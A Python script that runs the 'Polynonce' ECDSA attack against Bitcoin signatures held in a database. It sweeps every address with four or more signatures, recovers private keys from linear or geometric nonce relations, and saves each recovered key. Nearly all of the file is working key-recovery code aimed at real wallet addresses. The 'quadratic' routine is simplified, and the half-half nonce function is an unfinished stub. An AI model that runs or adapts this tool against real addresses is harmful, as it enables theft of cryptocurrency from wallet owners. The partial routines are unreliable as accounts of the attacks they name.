#!/usr/bin/env python3
"""
Polynonce Attack - exploits polynomial nonce relationships.
If k_i = a_0 + a_1*k_{i-1} + a_2*k_{i-1}^2 + ... (mod P)
then the private key can be recovered algebraically.

Based on Kudelski Security research (2023).
Requires at least 4 signatures for linear, 5 for quadratic.
"""
from db_manager import get_connection, add_recovered_key
from lattice_nonce_analyzer import verify_key

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def try_polynonce_linear(sigs, address):
    """
    Linear recurrence: k_{i+1} = a * k_i + b (mod P)
    With 4 signatures from the same key, we can solve for d.
    
    From ECDSA: s_i * k_i = z_i + r_i * d (mod P)
    So: k_i = s_i^{-1} * (z_i + r_i * d) (mod P)
    
    If k_{i+1} = a * k_i + b, substituting:
    s_{i+1}^{-1} * (z_{i+1} + r_{i+1} * d) = a * s_i^{-1} * (z_i + r_i * d) + b
    
    With 4 equations (3 consecutive pairs), we eliminate a, b and solve for d.
    """
    if len(sigs) < 4:
        return False
    
    print(f"  Polynonce linear: testing {len(sigs)} sigs...")
    
    # Try consecutive groups of 4
    for start in range(len(sigs) - 3):
        subset = sigs[start:start+4]
        
        # Precompute: u_i = s_i^{-1} * z_i, t_i = s_i^{-1} * r_i
        u = []
        t = []
        for sig in subset:
            s_inv = pow(sig['s'], -1, P)
            u.append((s_inv * sig['z']) % P)
            t.append((s_inv * sig['r']) % P)
        
        # k_i = u_i + t_i * d
        # k_{i+1} = a * k_i + b
        # So: u_{i+1} + t_{i+1}*d = a*(u_i + t_i*d) + b
        
        # From 3 consecutive pairs (0->1, 1->2, 2->3):
        # Eq1: u1 + t1*d = a*(u0 + t0*d) + b
        # Eq2: u2 + t2*d = a*(u1 + t1*d) + b
        # Eq3: u3 + t3*d = a*(u2 + t2*d) + b
        
        # Subtract Eq1 from Eq2:
        # (u2-u1) + (t2-t1)*d = a*((u1-u0) + (t1-t0)*d)
        # Subtract Eq2 from Eq3:
        # (u3-u2) + (t3-t2)*d = a*((u2-u1) + (t2-t1)*d)
        
        # Let: 
        # A1 = u2-u1, B1 = t2-t1, C1 = u1-u0, D1 = t1-t0
        # A2 = u3-u2, B2 = t3-t2, C2 = u2-u1, D2 = t2-t1
        
        A1 = (u[2] - u[1]) % P
        B1 = (t[2] - t[1]) % P
        C1 = (u[1] - u[0]) % P
        D1 = (t[1] - t[0]) % P
        
        A2 = (u[3] - u[2]) % P
        B2 = (t[3] - t[2]) % P
        C2 = (u[2] - u[1]) % P  # = A1
        D2 = (t[2] - t[1]) % P  # = B1
        
        # From the two equations:
        # (A1 + B1*d) = a*(C1 + D1*d)  => a = (A1 + B1*d)/(C1 + D1*d)
        # (A2 + B2*d) = a*(C2 + D2*d)  => a = (A2 + B2*d)/(C2 + D2*d)
        
        # Setting equal and cross-multiplying:
        # (A1 + B1*d)*(C2 + D2*d) = (A2 + B2*d)*(C1 + D1*d)
        
        # Expand both sides:
        # A1*C2 + A1*D2*d + B1*C2*d + B1*D2*d^2 = A2*C1 + A2*D1*d + B2*C1*d + B2*D1*d^2
        
        # (B1*D2 - B2*D1)*d^2 + (A1*D2 + B1*C2 - A2*D1 - B2*C1)*d + (A1*C2 - A2*C1) = 0
        
        coeff_a = (B1*D2 - B2*D1) % P
        coeff_b = (A1*D2 + B1*C2 - A2*D1 - B2*C1) % P
        coeff_c = (A1*C2 - A2*C1) % P
        
        # Solve quadratic: coeff_a * d^2 + coeff_b * d + coeff_c = 0 mod P
        candidates = solve_quadratic_mod(coeff_a, coeff_b, coeff_c, P)
        
        for d in candidates:
            if d == 0 or d >= P:
                continue
            if verify_key(d, address):
                d_hex = hex(d)[2:].zfill(64)
                print(f"  !!! POLYNONCE LINEAR SUCCESS: {d_hex[:20]}...")
                add_recovered_key(address, d_hex, method='Polynonce (Linear)')
                return True
    
    return False

def try_polynonce_quadratic(sigs, address):
    """
    Quadratic recurrence: k_{i+1} = a * k_i^2 + b * k_i + c (mod P)
    Requires 5 signatures minimum.
    """
    if len(sigs) < 5:
        return False
    
    print(f"  Polynonce quadratic: testing {len(sigs)} sigs...")
    
    for start in range(min(len(sigs) - 4, 10)):  # Limit iterations
        subset = sigs[start:start+5]
        
        u = []
        t = []
        for sig in subset:
            s_inv = pow(sig['s'], -1, P)
            u.append((s_inv * sig['z']) % P)
            t.append((s_inv * sig['r']) % P)
        
        # k_i = u_i + t_i * d
        # k_{i+1} = a * k_i^2 + b * k_i + c
        # This gives 4 equations (pairs 0->1, 1->2, 2->3, 3->4)
        # which is a higher-degree polynomial in d
        # We use resultants to eliminate a, b, c and find d
        
        # For efficiency, try the Gröbner basis approach:
        # Express as polynomial system and find common roots
        
        # Simplified approach: check if linear recurrence with offset works
        # k_{i+1} - k_i = a * (k_i - k_{i-1}) (geometric progression of deltas)
        
        # delta_i = k_{i+1} - k_i = (u_{i+1} - u_i) + (t_{i+1} - t_i) * d
        deltas = []
        for i in range(4):
            du = (u[i+1] - u[i]) % P
            dt = (t[i+1] - t[i]) % P
            deltas.append((du, dt))  # delta = du + dt * d
        
        # If delta_{i+1} = r * delta_i (geometric), then:
        # (du2 + dt2*d) * (du0 + dt0*d) = (du1 + dt1*d)^2
        # Cross multiply and solve
        
        for i in range(2):
            du0, dt0 = deltas[i]
            du1, dt1 = deltas[i+1]
            du2, dt2 = deltas[i+2]
            
            # (du2 + dt2*d)*(du0 + dt0*d) = (du1 + dt1*d)^2
            # du2*du0 + (du2*dt0 + dt2*du0)*d + dt2*dt0*d^2 = du1^2 + 2*du1*dt1*d + dt1^2*d^2
            
            ca = (dt2*dt0 - dt1*dt1) % P
            cb = (du2*dt0 + dt2*du0 - 2*du1*dt1) % P
            cc = (du2*du0 - du1*du1) % P
            
            candidates = solve_quadratic_mod(ca, cb, cc, P)
            for d in candidates:
                if d == 0 or d >= P:
                    continue
                if verify_key(d, address):
                    d_hex = hex(d)[2:].zfill(64)
                    print(f"  !!! POLYNONCE QUADRATIC SUCCESS: {d_hex[:20]}...")
                    add_recovered_key(address, d_hex, method='Polynonce (Quadratic)')
                    return True
    
    return False

def try_half_half_nonce(sigs, address):
    """
    'Half-Half' nonce: k = (k_high << 128) | k_low where k_high = k_low
    or k = concat(x, x) for some 128-bit x.
    This was found in real Bitcoin wallets (Kudelski 2023).
    """
    if len(sigs) < 2:
        return False
    
    print(f"  Half-half nonce: testing {len(sigs)} sigs...")
    
    for sig in sigs:
        s_inv = pow(sig['s'], -1, P)
        # k = u + t*d where u = s^-1 * z, t = s^-1 * r
        u_val = (s_inv * sig['z']) % P
        t_val = (s_inv * sig['r']) % P
        
        # If k has half-half structure: k = x * (2^128 + 1) for some 128-bit x
        # Then: x * (2^128 + 1) = u + t*d
        # We need another equation. Use pairs.
        for sig2 in sigs:
            if sig2 is sig:
                continue
            s_inv2 = pow(sig2['s'], -1, P)
            u2 = (s_inv2 * sig2['z']) % P
            t2 = (s_inv2 * sig2['r']) % P
            
            # k1 = x1 * M, k2 = x2 * M where M = 2^128 + 1
            # x1*M = u + t*d, x2*M = u2 + t2*d
            # x1 = (u + t*d) / M, x2 = (u2 + t2*d) / M
            # If x1 and x2 are both 128-bit, they are < 2^128
            # This is a bounded HNP instance
            M = (1 << 128) + 1
            M_inv = pow(M, -1, P)
            
            # Build a 2D lattice to find d such that both (u+t*d)/M and (u2+t2*d)/M are small
            # This is equivalent to the HNP with known MSBs
            pass  # Full lattice implementation needed - defer to solve_hnp
    
    return False

def solve_quadratic_mod(a, b, c, p):
    """Solve a*x^2 + b*x + c = 0 mod p using Tonelli-Shanks."""
    if a == 0:
        if b == 0:
            return []
        return [(-c * pow(b, -1, p)) % p]
    
    discriminant = (b * b - 4 * a * c) % p
    sqrt_d = tonelli_shanks(discriminant, p)
    if sqrt_d is None:
        return []
    
    inv_2a = pow(2 * a, -1, p)
    x1 = ((-b + sqrt_d) * inv_2a) % p
    x2 = ((-b - sqrt_d) * inv_2a) % p
    return [x1, x2]

def tonelli_shanks(n, p):
    """Compute square root of n mod p, or None if not a QR."""
    n = n % p
    if n == 0:
        return 0
    if pow(n, (p - 1) // 2, p) != 1:
        return None
    
    s = 0
    q = p - 1
    while q % 2 == 0:
        q //= 2
        s += 1
    
    if s == 1:
        return pow(n, (p + 1) // 4, p)
    
    z = 2
    while pow(z, (p - 1) // 2, p) != p - 1:
        z += 1
    
    c = pow(z, q, p)
    r = pow(n, (q + 1) // 2, p)
    t = pow(n, q, p)
    m = s
    
    while t != 1:
        i = 1
        temp = pow(t, 2, p)
        while temp != 1 and i < m:
            temp = pow(temp, 2, p)
            i += 1
        if i == m:
            return None
        b = pow(c, 2**(m - i - 1), p)
        r = (r * b) % p
        t = (t * b * b) % p
        c = (b * b) % p
        m = i
    
    return r

def run_polynonce_attacks(address=None):
    """Run polynonce attacks on all addresses with sufficient signatures."""
    conn = get_connection()
    c = conn.cursor()
    
    if address:
        c.execute("SELECT DISTINCT address FROM signatures WHERE address = ?", (address,))
    else:
        c.execute("SELECT address, COUNT(*) as cnt FROM signatures GROUP BY address HAVING cnt >= 4")
    
    targets = c.fetchall()
    conn.close()
    
    print(f"Polynonce attack: {len(targets)} addresses with 4+ sigs")
    
    for row in targets:
        addr = row[0]
        conn = get_connection()
        c = conn.cursor()
        c.execute("SELECT r_int, s_int, z_int, txid FROM signatures WHERE address = ?", (addr,))
        rows = c.fetchall()
        conn.close()
        
        sigs = [{'r': int(r), 's': int(s), 'z': int(z), 'txid': txid} for r, s, z, txid in rows]
        
        print(f"\n{addr} ({len(sigs)} sigs)")
        
        if try_polynonce_linear(sigs, addr):
            continue
        if try_polynonce_quadratic(sigs, addr):
            continue

if __name__ == "__main__":
    import sys
    addr = sys.argv[1] if len(sys.argv) > 1 else None
    run_polynonce_attacks(addr)
